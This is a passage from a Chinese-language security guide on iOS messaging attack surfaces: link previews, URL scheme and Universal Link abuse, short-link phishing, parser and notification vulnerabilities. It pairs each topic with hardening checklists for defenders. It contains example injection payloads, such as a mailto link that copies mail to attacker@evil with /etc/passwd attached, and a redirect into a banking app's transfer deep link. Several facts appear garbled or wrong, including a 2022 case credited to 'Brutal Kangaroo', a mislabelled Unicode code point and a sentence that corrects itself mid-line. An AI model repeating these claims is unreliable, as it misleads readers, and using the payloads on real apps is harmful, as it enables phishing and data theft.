**攻击者用途**：即使没有内存破坏漏洞，"预览请求"本身也是一个廉价的**存在探测/追踪工具**——这与邮件"远程图片追踪"完全同构。

### 7.7 链接预览相关 CVE 类型归纳

Apple 安全发布中常见的相关条目模板（历年反复出现，说明这是持续维护面）：

- `Link Presentation: Processing a maliciously crafted link may lead to disclosure of user information`
- `Messages: A malicious application may be able to access the user's Messages database`
- `Safari: Processing maliciously crafted web content may lead to arbitrary code execution`（预览抓取路径可命中）
- `ImageIO: Processing a maliciously crafted image may corrupt active memory`
- `WebKit: A remote attacker may be able to cause unexpected application termination or arbitrary code execution`

对研究者的启示：**不要只盯 Messages 组件的 CVE**，消息触发但缺陷位于共享框架的案例占比很高（参见 FORCEDENTRY/BLASTPASS）。

### 7.8 本章防御清单

1. 高风险用户开启 **Lockdown Mode**（明确禁用消息中的链接预览与部分自动解析）；
2. 企业侧：MDM 配置强制"过滤未知发件人"，配合内容过滤代理审查链接目标域名（需符合隐私法规）；
3. Web 运营者：`og:image` 使用可信 CDN，避免接受用户提交的 URL 作为元数据来源（防被用作"预览代理"）；
4. 开发者：任何"由远端 URL 驱动的预览/抓取"都应做 SSRF 防护（禁止内网/链路本地、协议白名单、大小限制、超时、内容类型校验）；
5. 用户：不要通过"卡片样式"判断站点可信度；始终核对实际域名。

---

## 第八章　URL Scheme 处理器漏洞

### 8.1 URL Scheme 机制回顾

iOS 通过 **URL Scheme（Custom Scheme / CFBundleURLTypes）** 允许 App 声明协议处理器，由系统服务 `com.apple.coreaudio`… 更准确地说由 **RunningBoard/CoreServices 的 `_LSOpenURLsWithRole` 与 `LSApplicationWorkspace`** 完成解析与跳转：

```
用户点击链接(短信/邮件/网页/通知)
   → WebKit/UIKit 调用 openURL(_:)/open(url:)
   → LaunchServices 解析 scheme → 匹配声明该 scheme 的 App
   → 目标 App 收到 application(_:open:) / scene(_:openURLContexts:)
   → App 自行解析 host/path/query 并执行动作
```

系统内建方案与用途：

| Scheme | 功能 | 典型风险 |
| --- | --- | --- |
| `http(s)://` | 浏览器/Universal Link | WebKit 面 |
| `sms:` / `smsto:` | 创建短信 | body/收件人注入、伪造 |
| `tel:` / `telprompt:` | 拨号 | 社会工程拨号、USSD/服务码滥用 |
| `mailto:` | 邮件 | 头注入（subject/cc/bcc/body） |
| `facetime:` / `facetime-audio:` | 视频通话 | 骚扰/探测 |
| `calshow:` / `webcal:` | 日历 | 订阅式日历垃圾与钓鱼 |
| `maps:` / `map:` | 地图 | 位置伪造、坐标参数注入 |
| `file://` | 本地文件 | 沙箱/权限（历史上若干读取缺陷） |
| `data:` / `blob:` | 内联数据 | WebKit/预览处理风险 |
| `itms-apps://` `itms-services://` | App Store / 企业描述文件安装 | 恶意配置描述文件投递 |
| `applink:` `alipay:` `weixin:` 等第三方 | App 间跳转 | 授权劫持、参数注入 |
| `shortcuts://` `shortcuts://run-shortcut?name=…` | 快捷指令 | 自动化触发（历史上"URL Scheme 触发快捷指令"是重点风险） |
| `prefs:` / `App-Prefs:` | 设置页跳转 | 骚扰式引导、越狱探测 |
| `jetbrains://` `cursor://` `vscode://` | 开发工具深链 | 打开文件/工程（配合其他缺陷可 RCE） |

### 8.2 参数注入与语义歧义

URL 是"字符串协议"，App 常自行做 query 解析，导致注入类缺陷：

```
sms:+8613800138000?body=请确认&cc=+8613900139000
mailto:victim@x?subject=Alert&body=Hi&cc=attacker@evil&attachment=/etc/passwd
tel:95110;100#           (拨号串包含分号/逗号 → 二次拨号/序列等待)
weixin://dl/business/?t=ATTACKER_TOKEN   (携带攻击者预授权 token)
shortcuts://run-shortcut?name=SendOTP    (触发本地自动化)
```

典型缺陷模式：

1. **多收件人注入**（sms/mailto 的 `cc`/`bcc`/`;`/`,`）：把用户消息复制到攻击者地址；
2. **正文注入**（`body=` 中的换行/百分号编码）：伪造"已验证"文案诱导用户回复；
3. **参数覆盖/混淆（parameter pollution）**：`?id=1&id=2`、`?redirect=/safe&redirect=/evil`，取决于解析顺序；
4. **CRLF/控制字符注入**：进入 HTTP-like 头处理路径时破坏语义；
5. **相对路径/`..` 注入**：App 用 host/path 拼接本地资源路径 → 目录穿越读取；
6. **scheme 归一化分歧**：`HTTP://`、`http:/`、`http:\`、`hxxp://`、全角/同形字符、`http://evil.com#.legit.com` 等，使"白名单校验"与"实际处理"不一致；
7. **deeplink 中的 token 重放**：把一次性授权链接（找回密码/支付确认）转发给他人即可复用；
8. **触发式自动化**：`shortcuts://` 与 App 内"打开即执行"的动作（历史上快捷指令 URL 动作曾被用于钓鱼）。

### 8.3 Intent/动作处理中的越权

App 常把 URL 参数直接映射到"内部动作"，形成 confused deputy（被混淆的代理人）问题：

```
remote URL ──► App 深链路由表 ──► 特权动作（发送消息/转账/修改设置/打开受保护页面）
                                     ▲
                                     └── 用户已登录、生物识别已放宽、会话可用
```

现实案例类别（公开报告/学术文献常见）：

- **免确认支付/转账**：深链带金额与收款方，UI 只呈现"确认"按钮；
- **社交 App 代发内容**：深链触发"以当前身份发布/回复"；
- **文件/相册访问**：`file://` 或共享容器路径被注入，读取其他 App 数据；
- **"打开受保护页面"**：跳过二次验证（2FA re-auth）直接访问设置/账单/导出；
- **OAuth code 窃取**：把 redirect URI 从 App 改为攻击者注册的 http scheme（无 PKCE / 无 loopback 校验）。

### 8.4 `canOpenURL` 与设备指纹（信息泄露）

- iOS 9 起，App 必须在 `Info.plist` 的 `LSApplicationQueriesSchemes` 中声明最多 50 个可探测 scheme；
- 攻击者（恶意 App 或网页）可通过 `canOpenURL`/`openURL` 的失败差异枚举：越狱工具、银行 App、密码管理器、企业 VPN、成人/政治敏感应用；
- 历史上出现过"利用 `telprompt://`/`prefs:` 的打开结果差异实现跨 App 状态探测"的研究；
- 现代缓解：Safari 对网页调用自定义 scheme 加了用户确认与速率限制；`LSApplicationQueriesSchemes` 限制枚举能力。

### 8.5 URL Scheme 攻击的短信入口组合

短信是 URL Scheme 最"顺"的触发通道：

```
Smishing 短信文本 → 用户点击链接 → Safari 重定向 → appScheme://… → 目标 App 特权动作
        (社会信任)        (无 JS 弹窗)       (域名伪装)        (深链注入)
```

常见规避：攻击者先给 `https://` 链接（可预览、显得正规），页面自动 `location.href = 'bankapp://transfer?...'` 完成 scheme 跳转，从而绕过"纯 scheme 链接被短信过滤/被用户警惕"的问题。

### 8.6 开发者加固清单

| 措施 | 说明 |
| --- | --- |
| 深链表最小化 | 只暴露必要动作，默认拒绝未知 host/path |
| 参数强类型校验 | 白名单正则 + 数值范围 + 枚举，禁止把远端值直接拼入路径/SQL/HTML |
| 敏感动作二次确认 | 转账/改绑/删除必须 UI 显式确认，且不允许被 URL 跳过 |
| 一次性 token 绑定会话 | 深链携带的 token 与设备/会话绑定、短 TTL、单次使用 |
| 避免 `canOpenURL` 探测 | 不用 scheme 存在性作为安全判断 |
| App Attested redirect URI | OAuth 使用 `https` + AASA + PKCE（见第九章） |
| 统一归一化 | 校验与使用同一 URL 解析器（避免"校验一处、执行另一处"） |
| 日志与限速 | 记录深链来源并做异常频率告警 |
| 渗透测试用例 | 把"来自短信/通知/网页的深链"作为固定测试向量 |

---

## 第九章　Universal Links 攻击面

### 9.1 机制回顾

Universal Links（UL，iOS 9 引入）让 `https://` 链接**直接打开 App 而不经过浏览器**，前提是域名与 App 建立关联：

```
1) App 声明 entitlement: com.apple.developer.associated-domains
     applinks:example.com?mode=controller?includeSubDomains
2) 域名发布 /.well-known/apple-app-site-association (AASA, JSON)
     { "applinks": { "details": [ { "appIDs": ["TEAMID.bundle.id"],
                                    "paths": ["/products/*", "/@NOT(/admin/*)"] } ] } }
3) iOS 在 App 安装/更新时（Safari 域访问触发时）抓取 AASA，写入 CoreServicesStore
4) 用户点击 https 链接 → 匹配已缓存的 AASA → 打开 App 并调用
   application(_:continue:) / scene(_:continueUserActivity:)
   若 App 未安装或匹配失败 → 交给浏览器
```

iOS 13+ 引入 `mode=controller`/`universalLinksOnly`；iOS 18.1 引入 **`Associated Domains Service`（私有 IPv6 代理预取 AASA）**，改变抓取时机并提升隐私。

### 9.2 攻击面分类

| 子类 | 机理 | 后果 |
| --- | --- | --- |
| A. AASA 托管缺陷 | 域名为子域/临时域、CDN 缓存不刷新、`.well-known` 被代理误配 | 关联被他人接管或过期错误 |
| B. 路径规则过宽 | `paths: ["/*"]` 或 `/` | 攻击者控制的任意子路径都进入 App |
| C. TeamID/AppID 复用 | 同一 Team ID 下多 App、或企业证书共享 | 恶意 App 声称合法域 |
| D. 用户授权绕过 | 历史版本 UL 可在无用户确认下打开 App（"silent UL"） | 隐私泄露、骚扰、跳转劫持 |
| E. 深度链接内容劫持 | UL 携带的 URL 被 App 再次传给 WebView/其他 scheme | 二级跳转（UL → WebView → JS → custom scheme） |
| F. Web-to-App 状态信任 | App 假定"来自 UL 的链接=已验证域名"，跳过校验 | IDOR/授权绕过 |
| G. 剪贴板与 `NSUserActivity` 数据 | userInfo/webpageURL 可控 | 注入到内部逻辑/日志/渲染 |
| H. 竞态/缓存不一致 | AASA 更新与本地缓存时序 | 短暂关联劫持 |

### 9.3 已知的"授权/隐私绕过"演进

- 早期 UL 可由后台 App 或网页**静默触发**（无用户手势）打开目标 App，研究者展示过"广告网络用 UL 探测已装 App 并跳转"的滥用；
- Apple 逐步加入 **顶部横幅"在 App 中打开"与浏览器内的显式确认**、限制 WebKit 在非用户手势下触发 UL、以及"用户点击后仍可选择留在 Safari"；
- 公开安全发布中曾出现与 UL 相关的修复条目（例如允许 App 打开任意 URL 或绕过 UL 限制的 Sandbox 类缺陷，iOS 12.x 时代有相应 CVE）；
- 研究文献（如 AsiaCCS 2019 的 "Pulling Threads"、2020 的 AppChameleon 等）系统展示了 UL/自定义 scheme 造成的跨 App 信息泄露与状态污染。

**防御性结论**：UL 的安全性质是"由域名所有者与 App 开发者共同维护的信任绑定"，任何一方疏漏都会把"官方 App 体验"变成"官方外观的钓鱼"。

### 9.4 深度链接劫持的典型攻击路径

```
(1) 短信/邮件/RCS 卡片：https://accounts.example.com/reset?token=…
(2) UL 命中官方 App → App 直接展示"重置成功/已进入账户页"（真实域名，用户信任）
(3) App 内部把 webpageURL 交给 WebView/内嵌 H5（同源混淆）
(4) 攻击者利用参数注入把 WebView 指向可控域，或复用 token 完成账户接管
```

变体：

- **"UL → 自定义 scheme → 攻击者 App"**：App 未校验 UL 内层的 scheme，被第三方注册的恶意 scheme 劫持；
- **"UL 作为 OAuth 回调"**：链接进入 App 后未校验 state/nonce，攻击者通过诱导点击完成授权码替换（这是移动 OAuth 最常见问题）；
- **"UL + 剪贴板"**：App 从 UL 参数写入剪贴板或自动填充，实现"点击即转账地址替换"（历史上多起真实事件）；
- **"UL 触发快捷指令/自动化"**：结合系统自动化形成"打开即执行"的强动作；
- **"UL 打开设置/拨号"**：把用户推进骚扰式流程（客服诈骗话术中"请打开设置→信任此描述文件"）。

### 9.5 Universal Link 的 SSRF/内网问题

若企业 App 把 UL 参数（如 `?image=`、`?url=`）在本地或后端二次抓取，会引入 SSRF；配合 iOS 设备处于企业 Wi‑Fi 的情况，可用设备作为内网探测跳板。开发者应避免让 UL 参数直接驱动抓取。

### 9.6 加固清单

**开发者/平台**：

1. AASA 使用固定路径与静态 JSON、避免过宽 `paths`、用 `/exclude/*` 显式屏蔽敏感路径；
2. AASA 域名与业务域名严格归属校验，禁用开放重定向域作为 `applinks`；
3. 处理 UL 时把 URL 当作**不可信输入**：校验 host/scheme/路径/参数、拒绝内网/自定义 scheme 转发；
4. OAuth：强制 PKCE + HTTPS redirect + `universalLinksOnly=true` + state/nonce 校验；
5. 敏感动作要求 App 内二次验证，而非"能进 App 即已授权"；
6. 记录 UL 来源并在异常频次（例如同一链接短时大量设备打开）时告警。

**用户/企业**：

1. 对"自动跳到 App"的行为保持警觉——尤其在点击短信链接时；
2. 需要 Web 流程时用 Safari 打开（长按链接→"在 Safari 中打开"），可避开 UL 劫持；
3. MDM 可限制企业 App 的深链使用范围与配置描述文件安装（见第十七章）。

---

## 第十章　短链服务与钓鱼

### 10.1 短链的攻击价值

短链（t.cn、bit.ly、tinyurl、s.id、自有企业短域）把 URL 语义压缩成不可见字符串，为攻击者提供三重收益：

1. **隐藏真实目标**（用户与静态过滤器无法判断）；
2. **压缩文本预算**（SMS 160 字符内塞入更多话术）；
3. **可观测性**（点击统计、地理/设备指纹、A/B 文案、按点击次数切换落地页）。

### 10.2 重定向链与"最后一跳"欺骗

```
SMS:  【XX银行】您的账户存在异常，请核验 https://t.cn/AbC123
        ↓ HTTP 301
      https://link-short.example/redirect?...
        ↓ 302 (按 UA/时间/点击数分流)
      http://xn--80ak6aa92e.com/login      (同形域名)
        ↓ 页面内 JS location = 'bankapp://verify?acct=…'
      官方 App 深链（真实域名外观 + 真 App 界面）
```

关键欺骗技术：

- **点击前预览显示合法域，点击后跳转恶意域**（利用 7.2 的解析分歧与重定向）；
- **分流（cloaking）**：对安全爬虫/沙箱返回干净页面，对真实设备返回钓鱼页；
- **一次性短链**：TTL 极短，事后无法取证；
- **合法域上的开放重定向**（`?redirect=`）借真域名信誉；
- **同形/近似域名（Homograph）**：punycode、组合 Unicode、同形西里尔字符；
- **子域名拼接**：`legit.com.evil.tld` 与 `evil.tld/legit.com`；
- **URL 编码/双重编码、空格、`@` 与 `#` 利用**。

### 10.3 短链与消息平台的"预览协同漏洞"

短链在 Messages 中的表现是攻击设计的核心变量：

| 现象 | 攻击利用 |
| --- | --- |
| 预览卡片显示短链服务品牌（bit.ly 图标） | 借用"知名服务"外观建立信任 |
| 预览抓取发生在点击前 | 攻击者确认可疑号码"是真人设备且在线" |
| 预览只显示 `og:title`（由远端控制） | 卡片标题伪造"苹果安全中心""银行风控" |
| 预览缓存 | 卡片文案可在用户多次查看时保持不变而实际目标已变 |
| 短链域被大量用户点击 | 通过 CDN/服务信誉绕开"未知链接"过滤 |

### 10.4 追踪参数与二次伤害

钓鱼/恶意站点常携带 `?utm_source=sms&uid=13800138000`：

- **个性化伪装**："亲爱的张三"来自 URL 参数，页面 JS 直接渲染；
- **受害者状态标记**：点击即标记，后续多轮钓鱼优先；
- **数据回流到 A/B 测试**：话术/落地页/按钮颜色由自动化决定（现代 Phishing-as-a-Service 已普遍使用）；
- **隐私影响**：用户号码与 IP 关联，形成可售卖的"可触达名单"。

### 10.5 QR 码集成（Quishing）

CISA 于 2023 年 6 月专门发布 Quishing 警告。短信/邮件 + QR 组合的典型形态：

- "扫码联系客服/领取补贴/查看快递"——扫码行为**绕过移动端 URL 信誉检查**（阅读器通常不显示完整目标或不做预览）；
- QR 内含 URL Scheme/UL/OAuth 深链，把手机直接推到 App 内部动作；
- 印刷贴纸覆盖合法二维码（停车罚单/充电桩/ATM/物流标签），iPhone 相机识别即触发通知预览，历史上曾有"扫描后自动跳转"的体验；
- 与"链接预览抓取"叠加：相机预览也可能触发资源加载（视实现而定）。

### 10.6 短链钓鱼的量化特征（检测用）

| 特征 | 说明 |
| --- | --- |
| 域名年龄 < 30 天 | 新注册短链/仿冒域 |
| 重定向跳数 ≥ 3 | 掩盖最终目的 |
| 一跳为短链服务、二跳为云函数/免费托管 | 常见 attacker infra 组合 |
| HTTPS 但证书为 DV 免费证书 | 无组织验证 |
| 同 IP 上多个不相关短链域 | 集群化投放 |
| 页面包含 `location.href='scheme://'` | App 深链跳转 |
| 表单立即索取 OTP/卡号/CVV | 高置信钓鱼 |
| 文案含"限时/账户冻结/公安/法院" | 情绪驱动关键词 |
| 号码来自国际/虚拟段 | 网关伪冒 |
| 同一短链在多国家同时出现 | PaaS 分发 |

### 10.7 平台与运营者防御

1. **短信网关侧**：强制退订标识、限制字母型 Sender ID 滥用（SenderID 白名单/预注册）、对模板变量做长度与 URL 计数限制；
2. **短链服务商侧**：URL 信誉校验（落地页扫描）、滥用举报通道、按速率/新域封锁、禁止匿名注册高信誉模板；
3. **接收侧（iOS/Android）**：预览阶段对短链执行"展开后再评估"，显示真实目的域（现代 Safari/Chrome 已实现部分能力）；
4. **企业消息运营**：使用自有短域 + 严格 TLS + 不做开放重定向 + 参数不暴露用户数据；
5. **检测运营**：建立短链展开流水线（沙箱 + 无头浏览器 + UA 双取），把"cloaking"作为专项检测（对爬虫与对设备各取一次并比对）。

### 10.8 用户侧建议（可直接下发）

- **永远长按/右键链接查看真实地址**，不要凭卡片判断；
- 收到"官方"短信要求操作时，**不用链接，改从官方 App 或客服号码进入**；
- 对短链保持最高怀疑：银行、政府、快递类短信中的短链是最常见攻击向量；
- 关闭陌生号码的链接预览与消息通知（Lockdown Mode 用户自动获得）；
- 不要扫码后立刻授权 App 动作，注意"打开 App"横幅上的目标；
- 遇到疑似 Smishing：截图保存、不点击、举报（12321/运营商）、并在企业内上报安全团队。

---

## 第十一章　消息解析器漏洞技术

### 11.1 消息文本进入 iOS 之后的完整路径

```
Baseband/NAS(SMS-DELIVER) → CoreTelephony(PDU 解码) → Messages 数据库落库
    → (BlastDoor 解析富内容) → NSAttributedString 构造 → TextKit 排版
    → 数据检测器(NSDataDetector/LinkPresentation) → 单元格渲染(UITableViewCell)
    → 通知横幅(SpringBoard) → 搜索/建议(Spotlight/Siri 实体抽取)
```

**每一跳都是一个解析器**，每一跳都可能存在缺陷。攻击者会选择"最早、最自动化"的那一跳。

### 11.2 字符编码与 Unicode 处理

| 主题 | 攻击相关事实 |
| --- | --- |
| GSM 7-bit 与 UCS-2 切换 | DCS 指示编码；若解析器与渲染器对编码判断不一致，会出现"校验通过的文本被以另一种解释显示" |
| Septet 打包/解包 | 7-bit 压缩算法的位移计算，历史上有 off-by-one 类缺陷 |
| UCS-2 与 UTF-16 代理对 | 代理对（surrogate pair）截断：分割/替换逻辑按 code unit 而非 code point 操作，导致半个代理项（unpaired surrogate）→ 渲染异常或越界 |
| 组合序列 | Emoji ZWJ 序列（👨‍👩‍👧）、变体选择符 VS15/16、肤色修饰符、区域指示符；排版器按 grapheme cluster 计算宽度，长度记账错误即风险 |
| RTL/LTR 双向算法（Bidi, UAX#9） | 双向覆盖导致的显示欺骗（见 11.3） |
| Unicode 归一化（NFC/NFD/NFKC） | 归一化差异使"域名白名单校验"与"实际访问"不一致；同形字符攻击 |
| Punycode/IDN | `xn--` 域名的视觉欺骗（同形异义字符） |
| 控制字符与格式字符 | RLO/LRO/RLE/PDF/FS、零宽空格 U+200B、零宽连接符 U+2060、方向隔离 LRI/RLI/FSI/PDI（U+2066–U+2069） |
| Unicode 版本漂移 | 新码点/新 Emoji 在未更新字体/解析表的旧系统上可能触发渲染缺陷（历史上出现过具体崩溃事件） |

**2018 年"Unicode 文本炸弹"事件（iOS 侧典型）**：含特定组合字符序列的消息（例如印度文/僧伽罗文等特殊标记组合，以及由"希伯来方向覆盖符 U+202E／U+202D + 区域指示符/变体选择符"拼成的畸形序列）会导致 Messages、WhatsApp、邮件等在 `CoreText`/`FontServices` 渲染阶段崩溃，出现"收到即闪退、消息无法删除"的效果。这是 S3 层（渲染）DoS 的代表案例：攻击成本极低、影响面明显，且**不需要任何漏洞利用原语即可造成设备不可用**。

**2023 年 "iMessage 炸弹"（Text Bomb）事件**：攻击者利用消息中的特殊构造内容（含畸形附件/属性组合），迫使目标设备**反复重启且无法通过常规方式清除**（消息在重启后继续触发解析）。Apple 在 iOS 16.4（2023 年 3 月）修复，Apple 支持文档明确"重置iPhone"是清除受影响消息的最后手段。此案例说明：**DoS 型消息缺陷可被武器化为"设备拒服务"攻击**，用于针对记者/活动人士的骚扰性压制。

### 11.3 RTL 双向文本欺骗（显示与真实不一致）

原理：Unicode Bidi 算法允许嵌入控制字符（U+202E RLO、U+202D LRO、U+2066–U+2069 方向隔离符）改变文本的**显示顺序**，而不改变**存储顺序**。

```
存储（码点顺序）：evil.com + U+202E + moc.tileg
显示（用户所见）：evil.com/legit…      ← 视觉上像"legit"域名的链接
说明：U+202E 之后的一段被双向算法整体反转，因此攻击者可
      把恶意域名的前缀伪装成合法域名的外观；文件名同理
      （report.pdf + U+202E + fdp.exe → 显示为 report.exe.pdf 类效果）
```

在 iOS 上的现实影响：

1. **消息正文/URL 卡片**显示伪造域名或文件名（利用 U+202E 制造"扩展名/域名反转"，iOS 上主要体现为文件名后缀与链接文本欺骗）；
2. **通知横幅**截断显示（用户只看到前半段），配合 RLO 可让关键部分被隐藏；
3. **联系人名称**双向控制使"银行"名字显示在攻击号码旁；
4. **Safari 地址栏**：Apple 通过同形字符显示 punycode、URL 全量高亮等措施缓解，但组合"截断 + 双向控制"仍是有效钓鱼技巧；
5. **日志/取证影响**：调查人员按显示顺序阅读会误判真实内容（必须在取证中做码点级解析）。

防御：渲染层对含方向控制字符的字符串进行"可见标记"处理；域名与文件扩展名以**码点顺序**而非显示顺序校验；工具链（MVT/取证）输出转义形式。

### 11.4 消息中的 HTML/富文本处理

iOS Messages 正文本质是 `NSAttributedString`。风险面：

| 场景 | 内容形式 | 典型缺陷 |
| --- | --- | --- |
| 短信/彩信正文 | 纯文本 + GSM/UCS | 长度/编码 |
| 邮件转消息/富文本 | HTML→属性字符串 | HTML 解析、内联 CSS、远程图片加载 |
| iMessage 富文本 | 归档属性 | `NSKeyedUnarchiver` 类白名单、属性范围 |
| MMS SMIL | XML 布局 | 外部实体/引用、路径混淆 |
| 消息扩展（App 插件） | 自定义视图 + JSON | 第三方解析器（把 Web 面带入 Messages） |
| 剪贴板交换 | 富文本粘贴 | 格式混淆、隐藏文本（历史 `text-content` 攻击） |

**HTML/隐藏文本攻击（2023 公开研究）**：攻击者在页面中放置肉眼不可见的文本（`display:none`、`color:transparent`、`aria-label`），被 AI 摘要系统/搜索引擎抓取，从而"在用户看不到的情况下篡改搜索结果与助手回答"。这与消息场景结合形成新型欺骗：**预览卡片的描述由远端 HTML 决定，用户看到的"简介"可以是攻击者写的文案**。

**"Text Content Stealing"（剪贴板类，2022 公开研究）**：粘贴富文本时，可见文本与内部 `text/plain` 版本可以不一致，导致用户以为粘贴了 A 实际粘贴 B。在"粘贴收货地址/转账账号"场景下危害显著。

### 11.5 格式化字符串与占位符

历史上 iOS 的消息/通知路径出现过与格式化相关的缺陷（`%@`/`%d` 类型与对象不匹配导致崩溃或信息泄露，多为开发错误被远端触发）。攻击模型：

- 远端文本中含 `%@`、`%s`、`%{public}s` 等，进入 `stringWithFormat:`/日志格式化；
- OSLog 的 `%{private}s` vs `%{public}s` 决定日志是否泄露敏感内容；
- 若开发者用远端数据构造格式串，可能造成越界读或崩溃。

防御铁律：**格式串永远来自代码常量，绝不来自外部输入**；对消息内容做格式化时先转义 `%`；日志中消息正文默认私有化。

### 11.6 反序列化：iMessage 的结构性风险

`NSKeyedUnarchiver` 相关缺陷是 iOS 消息史上最高价值的类型之一：

```
消息归档(NSData) → NSKeyedUnarchiver → 类图重建 → 对象方法调用
                          ▲
                          └── 未限制 allowedClasses 时，任何 NSObject 子类都可能被实例化
```

风险要点：

1. **类白名单缺失**（Apple 已在关键路径逐步强制 `requiresSecureCoding` 与类白名单）；
2. **`initWithCoder:` 中的二次解析**：某对象在解码时又去解析远端数据（FORCEDENTRY 的 PDF/Core Animation 路径即属于"解码期触发深度解析"）；
3. **递归深度**导致栈耗尽或整数溢出；
4. **版本兼容解码**：为兼容旧版本消息，解码器必须支持历史格式，扩大了可达代码；
5. **类型混淆**：CLOUDPRONG 表明"数值语义在序列化/原子化过程中的类型解释错误"同样致命。

审计清单：

- 所有 `unarchiveObject(with:)`/`decodedClasses` 调用是否限定类；
- 归档数据是否可由远端消息控制；
- 解码路径是否触发网络/文件/其他框架；
- 是否有 fuzz 覆盖（libFuzzer + 归档语料）。

### 11.7 消息解析器的 Fuzzing 方法

```
                ┌──────────────────────────────┐
   种子语料 ───►│  结构感知变异器(SMS PDU / WBXML │
 (真实消息库)   │  /SMIL/PDF/PKPASS/plist/归档)  │
                └───────────┬──────────────────┘
                            ▼
                   目标：BlastDoor 服务/框架解析器
                   (真机/虚拟机 + ASan/护栏 + 崩溃采集)
                            ▼
                  去重(崩溃栈)→可复现性验证→S0–S4 归因
```

实践要点：

1. **协议级 grammar**：为 WBXML MBI、UDH 分段、SMIL、VCARD、PKPASS 建立 grammar 描述；
2. **跨通道复用**：同一份畸形文件分别在 iMessage/MMS/RCS/邮件/文件 App 中测试（框架级漏洞一处发现多处置顶）；
3. **状态矩阵**：锁屏/解锁、是否开启"过滤未知发件人"、是否低数据模式、是否 Lockdown Mode——这些都会改变解析路径；
4. **渲染层 fuzz**：把 Unicode 组合序列、双向控制、代理对截断作为专门词表；
5. **遥测**：在越狱/研究设备上采集 `DiagnosticReports`（`Messages`、`backboardd`、`mediaserverd`、`SpringBoard`）以识别 DoS 类缺陷。

### 11.8 解析缺陷与"可利用性"的距离

| 缺陷类型 | 可利用性 | 说明 |
| --- | --- | --- |
| 越界读 | 中（信息泄露/ASLR 绕过） | 常作为链的一环 |
| 堆溢出（写） | 高 | 需要堆布局控制（消息可触发大量可控分配） |
| 类型混淆 | 极高 | 可直接获得读写原语（CLOUDPRONG/SPYWARE 类） |
| 整数溢出→小分配 | 高 | 经典 MMS/WBXML 模式 |
| `NSKeyedUnarchiver` 逻辑缺陷 | 极高 | 可触发"任意类解码 + 方法调用" |
| 双重释放 | 高 | 需堆风水 |
| 渲染 DoS | 低（仅拒服务） | 但可被用作骚扰/压制，也可作为触发链前置 |
| 解析分歧 | 中高（钓鱼绕过） | 逻辑缺陷，工程成本低 |

---

## 第十二章　通知触发与渲染漏洞

### 12.1 APNs 与通知处理链

```
App 服务器 ──(JWT/证书鉴权)──► APNs ──(TLS)──► 设备 apsd
                                              │
                                              ├─► 目标 App（后台唤醒）
                                              ├─► NotificationService(扩展, 处理可变内容)
                                              └─► NotificationCenter/SpringBoard 渲染
```

推送 payload 是**完全由远端控制的 JSON**（`aps.alert`、`aps.badge`、`aps.sound`、`aps mutable-content`、`aps.thread-identifier`、自定义键）。iMessage 依赖 APNs 作为唤醒信号，因此"通知面"与"消息面"天然相连。

### 12.2 Notification Service Extension（NSE）

- NSE 运行在**独立进程、受限沙箱**，但拥有网络访问能力（这是它存在的目的：下载加密附件/富媒体）；
- 关键点：**NSE 会执行第三方 App 代码**，且代码在处理推送时被自动调用；
- 风险：
  1. NSE 内部把 payload URL 交给解析器（图像/JSON/自定义协议）→ 攻击者若能控制推送（服务器凭证泄露、APNs 证书滥用），即可无交互触发；
  2. NSE 与主 App 的共享容器（App Group）成为跨进程数据通道，若共享对象被信任则可形成 confused deputy；
  3. NSE 崩溃会导致"通知不显示"（隐蔽 DoS）；
  4. 历史上曾出现与推送处理相关的信息泄露/内存破坏类 CVE（Apple 安全发布中反复出现 "Push Services"/"Notifications" 条目）。

### 12.3 Notification Content Extension（NCE）与自定义 UI

- NCE 用第三方视图渲染通知内容，等于**把远端可控输入送进一个可执行任意 UI 代码的进程**；
- 风险：伪造系统通知外观（钓鱼常用手法：假的"银行验证"通知带"批准/拒绝"按钮，点击即执行攻击者期望动作）；
- 系统缓解：横幅必须显示 App 图标与名称、长按可跳转设置、锁屏通知需解锁才展示内容（默认）。

### 12.4 通知面的社会工程与显示欺骗

| 手法 | 效果 |
| --- | --- |
| 通知内容截断 | 关键提示（"这不是 Apple 官方"）被隐藏 |
| `title`/`body` 完全由远端决定 | 伪造发件人、金额、验证码 |
| 声音/图标复用 | 让用户误认为是官方 App |
| 高频推送（notification bombing） | 迫使用户"关掉通知"后落入钓鱼流程 |
| Live Activities / Dynamic Island 滥用 | 长时间驻留的可控 UI |
| CallKit/Connection Frameork 假来电 | 显示"苹果客服"名称的 VoIP 来电 |

**2022 年 "Brutal Kangaroo / 假 Apple 客服来电"案例**：攻击者通过滥用企业通信服务（3CX 类 CallKit VoIP 通道）向目标 iPhone 推送**显示为"Apple"或合法机构名称**的来电通知，随后以"你的设备被入侵，请配合"话术诱导安装 MDM 描述文件，完成设备接管。该案例展示了通知面 + 深链 + MDM 的组合威力。

### 12.5 零点击通知的可能性与边界

**要区分两类"零点击"**：

1. **渲染层零点击**：通知在锁屏显示即触发渲染，若渲染器（CoreText/图像/自定义扩展）存在内存破坏，用户无需解锁即被利用；
2. **NSE 处理零点击**：NSE 在展示前自动执行第三方代码，若该代码有缺陷且推送可控，同样无需交互。

现实约束：

- 推送需要目标 App 的服务器密钥（APNs Auth Key/Token）或该 App 服务端被入侵；
- iMessage 推送载荷本身不含消息内容（仅唤醒），故内容解析仍在设备侧消息栈；
- 攻击者可自建合法 App 诱导安装（先钓鱼再推送），或劫持企业推送服务凭证；
- 因此推送面更多被用作"持久化与唤醒"，而非首选初始访问。

### 12.6 加固建议

**Apple/系统**：NSE/NCE 沙箱最小权限、禁止扩展在无用户交互时执行任意网络抓取、渲染进程强类型化、通知 UI 强制显示来源标识。

**开发者**：

- 推送 payload 视为不可信输入（长度/类型/枚举校验，绝不直接拼 URL/路径/HTML/格式串）；
- NSE 中不做深度解析，下载后交给主 App 且在受限环境校验；
- 敏感通知不显示关键数据（验证码/余额）；
- 限制"可点击即执行"的动作；所有按钮动作需 App 内确认；
- 服务器凭证轮换与最小权限（APNs Key 定期更换、仅限必要服务）。

**企业/用户**：

- 关闭不必要 App 的通知与锁屏预览（设置→通知→显示预览：仅解锁时）；
- 警惕"显示为 Apple/银行"的来电与消息；官方不会通过电话指导安装描述文件；
- MDM 可限制描述文件安装（禁止非监督安装）、限制通知通道（如禁用第三方 VoIP）。

---

## 第十三章　附件与嵌入内容漏洞

### 13.1 Messages 支持的附件/嵌入类型

| 类型 | 承载格式 | 处理框架 | 历史风险 |
| --- | --- | --- | --- |
| 图片 | JPEG/PNG/HEIC/GIF/TIFF/RAW/BMP | ImageIO、CoreImage | CVE-2016-4657、历年 ImageIO 条目 |
| 视频 | MP4/MOV/3GP | CoreMedia、AVKit、VideoToolbox | 原子盒解析越界 |
